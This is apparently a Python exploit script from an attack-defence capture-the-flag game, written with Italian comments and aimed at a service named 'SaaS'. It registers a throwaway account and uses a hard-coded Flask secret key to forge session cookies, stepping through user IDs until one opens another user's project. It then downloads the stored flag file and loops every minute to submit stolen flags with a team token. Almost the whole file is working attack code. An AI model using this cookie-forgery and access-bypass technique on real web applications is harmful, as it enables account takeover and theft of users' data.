#/usr/bin/python3

import requests, time, re, string, random
from threading import Thread, Lock
import requests
import os
import json
import base64
from requests import session
import re
from flask.sessions import SecureCookieSessionInterface
from itsdangerous import URLSafeTimedSerializer

TEAM_TOKEN = "30079879d4f6d98c63404aca4a44caaa"			# TEAM_TOKEN INVIATO PER EMAIL
CHALLENGE_NAME = "SaaS"		# NOME DELLA CHALLENGE INDICATO IN flagIds

#######################      UTILS      ######################################

class SimpleSecureCookieSessionInterface(SecureCookieSessionInterface):
    # Override method
    # Take secret_key instead of an instance of a Flask app
    def get_signing_serializer(self, secret_key):
        if not secret_key:
            return None
        signer_kwargs = dict(
            key_derivation=self.key_derivation,
            digest_method=self.digest_method
        )
        return URLSafeTimedSerializer(secret_key, salt=self.salt,
                                      serializer=self.serializer,
                                      signer_kwargs=signer_kwargs)

def decodeFlaskCookie(secret_key, cookieValue):
    sscsi = SimpleSecureCookieSessionInterface()
    signingSerializer = sscsi.get_signing_serializer(secret_key)
    return signingSerializer.loads(cookieValue)

# Keep in mind that flask uses unicode strings for the
# dictionary keys
def encodeFlaskCookie(secret_key, cookieDict):
    sscsi = SimpleSecureCookieSessionInterface()
    signingSerializer = sscsi.get_signing_serializer(secret_key)
    return signingSerializer.dumps(cookieDict)

def generate_random_string(length):
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

def generate_fake_flag():
    letters = string.ascii_uppercase + string.digits
    result_str = ''.join(random.choice(letters) for i in range(31)) + "="
    return result_str

def add_noise(url, header=None, payload=None, session=None):
	if payload == None:
		if session == None:
			if header == None:
				requests.get(url, timeout=3)
			else:
				requests.get(url, headers=header, timeout=3)
		else:
			if header == None:
				session.get(url, timeout=3)
			else:
				session.get(url, headers=header, timeout=3)
	else:
		if session == None:
			if header == None:
				requests.post(url, data=payload, timeout=3)
			else:
				requests.post(url, headers=header, data=payload, timeout=3)
		else:
			if header == None:
				session.post(url, data=payload, timeout=3)
			else:
				session.post(url, headers=header, data=payload, timeout=3)

	print(f"Rumore aggiunto - {url} : {payload}")

##############################################################################


#noFlagIds = {CHALLENGE_NAME: {'10.60.1.1': [''], '10.60.2.1': [''], '10.60.3.1': [''], '10.60.4.1': [''], '10.60.5.1': [''], '10.60.6.1': [''], '10.60.7.1': [''], '10.60.8.1': [''], '10.60.9.1': [''], '10.60.10.1': [''], '10.60.11.1': [''], '10.60.12.1': [''], '10.60.13.1': [''], '10.60.14.1': [''], '10.60.15.1': [''], '10.60.16.1': [''], '10.60.17.1': [''], '10.60.18.1': [''], '10.60.19.1': [''], '10.60.20.1': [''], '10.60.21.1': [''], '10.60.22.1': [''], '10.60.23.1': [''], '10.60.24.1': [''], '10.60.25.1': [''], '10.60.26.1': [''], '10.60.27.1': [''], '10.60.28.1': [''], '10.60.29.1': [''], '10.60.30.1': [''], '10.60.31.1': [''], '10.60.32.1': [''], '10.60.33.1': [''], '10.60.34.1': [''], '10.60.35.1': [''], '10.60.36.1': [''], '10.60.37.1': [''], '10.60.38.1': [''], '10.60.39.1': [''], '10.60.40.1': [''], '10.60.41.1': [''], '10.60.42.1': [''], '10.60.43.1': ['']}}

lock = Lock()


class Attacker(Thread):
	def __init__(self, ip, flagids):
		Thread.__init__(self)
		self.ip = ip
		self.flagids = flagids
		

	def run(self):
		flag_list = []
		for hint in self.flagids[CHALLENGE_NAME][self.ip]:
			try:
				flag = get_flag(self.ip, hint["project_id"])
				print(flag)
			except Exception as e:
				print("ERR: {}".format(e))
				continue
			if flag not in flag_list:
				flag_list.append(flag)
	
		lock.acquire()
		flags.extend(flag_list)
		lock.release()


def exploit_with_threads(flagids):
	c = 1
	i = 0
	size = len(flagids[CHALLENGE_NAME])
	for ip in flagids[CHALLENGE_NAME]:
		print(f"{ip}\t-\t{c} / {size} ...")

		threads.append(Attacker(ip, flagids))
		threads[i].start()

		i += 1
		c += 1
	
	for i in range(size):
		threads[i].join()


def exploit(flagids):
	flag_list = []
	c = 1
	for ip in flagids[CHALLENGE_NAME]:
		size = len(flagids[CHALLENGE_NAME])
		print(f"{ip}\t-\t{c} / {size} ...")
		for hint in flagids[CHALLENGE_NAME][ip]:
			try:
				flag = get_flag(ip, hint["project_id"])
				print(flag)
			except Exception as e:
				print("ERR: {}".format(e))
				continue
			if flag not in flag_list:
				flag_list.append(flag)

		c += 1
	return flag_list


# EXPLOIT FINALE CON USO DEI THREADS
def attack_with_threads():
	global flags
	global threads
	while True:
		flags = []
		threads = []
		print("Running exploit...")

		flagids = requests.get("http://10.10.0.1:8081/flagIds?service=SaaS").json()
		# flagids = noFlagIds
		exploit_with_threads(flagids)
		
		print()
		print(flags)

		print("\nPutting flags...")
		r = requests.put('http://10.10.0.1:8080/flags', headers={'X-Team-Token': TEAM_TOKEN}, json=flags).text
		print(r)

		print("Exploit ok...\n\nRepeat after sleep...")
		print("\n")

		time.sleep(60)


# EXPLOIT FINALE
def attack():
	while True:
		print("Running exploit...")

		flagids = requests.get("http://10.10.0.1:8081/flagIds?service=SaaS").json()
		# flagids = noFlagIds
		flags = exploit(flagids)
		
		print()
		print(flags)

		print("\nPutting flags...")
		r = requests.put('http://10.10.0.1:8080/flags', headers={'X-Team-Token': TEAM_TOKEN}, json=flags).text
		print(r)

		print("Exploit ok...\n\nRepeat after sleep...")
		print("\n")

		time.sleep(60)
			
	
def get_flag(ip, hint):
	sk = '1491f55f179f5a02169ddfc20aefe41e'
	found=False

	headers = {"Content-Type": "application/x-www-form-urlencoded"}
	username = generate_random_string(10)
	password = generate_random_string(10)
	data = f"username={username}&password={password}&submit=Register"
	register = requests.post(f"http://{ip}:5555/register", headers=headers, data=data)
	cookie = register.cookies.get_dict()["session"]
	i = decodeFlaskCookie(sk, cookie)["user_id"]

	while not found:
		base='http://'+ip+':5555/project/'+hint
		sessionDict = {u'user_id':i}
		c = encodeFlaskCookie(sk, sessionDict)
		#print(c)
		decodedDict = decodeFlaskCookie(sk, c)
		# print(decodedDict)
		cookies_session={'session': c}

		s= requests.Session()
		tmp=s.get(base,cookies=cookies_session, timeout=1)
		
        
		if(tmp.status_code==401):
			pass
		else:
			regex = r'let filename_to_uuid = {[\s\S]*?};'

			match = re.search(regex, tmp.text)
            
			tmp=match.group().split(":")[1].strip().split(",")[0]
			file=tmp[1:-1]
			tmp=s.get(base+'/file/'+file+'/download',cookies=cookies_session, timeout=1)
			return tmp.text
                
		i-=1
	


## TEST get_flag
def test():
	ip = "10.60.0.1"
	hint = "a41a45cf-cbfc-4d80-acfe-567e68e00ce0"
	flag = ""
	try:
		flag = get_flag(ip, hint)
	except Exception as e:
		print(f"ERROR {e}")
		return
	print(flag)

	flags = [flag]
	print("\nPutting flags...")
	r = requests.put('http://10.10.0.1:8080/flags', headers={'X-Team-Token': TEAM_TOKEN}, json=flags).text
	print(r)


def main():
	# test()
	# attack()
	attack_with_threads()


main()
